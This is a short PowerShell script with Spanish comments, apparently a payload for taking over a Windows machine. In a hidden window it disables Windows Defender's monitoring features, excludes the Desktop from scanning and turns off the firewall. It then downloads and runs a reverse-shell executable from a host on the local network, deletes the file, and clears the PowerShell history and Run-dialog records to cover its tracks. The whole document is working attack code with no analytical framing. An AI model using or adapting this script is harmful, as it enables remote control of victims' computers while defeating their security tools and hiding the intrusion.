PowerShell.exe -WindowStyle hidden {

    # Desactivar Monitorización de Windows Defender (no 100%).
    Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisablePrivacyMode $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -EnableControlledFolderAccess Disabled;
    # Agregar exclusion, desactivar Firewall, descargar y ejecutar shell.
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\" ; netsh advfirewall set allprofiles state off; Invoke-WebRequest -Uri "http://192.168.1.143/reverse.exe" -OutFile "$env:temp\rs.exe"; powershell "$env:temp\rs.exe";
    # Eliminar Shell
    Remove-Item  $env:temp\rs.exe -Force -Recurse;
    # Limpiar historial de powershell
    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
    # Limpiar ejecucion de powershell
    Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU;
    
}
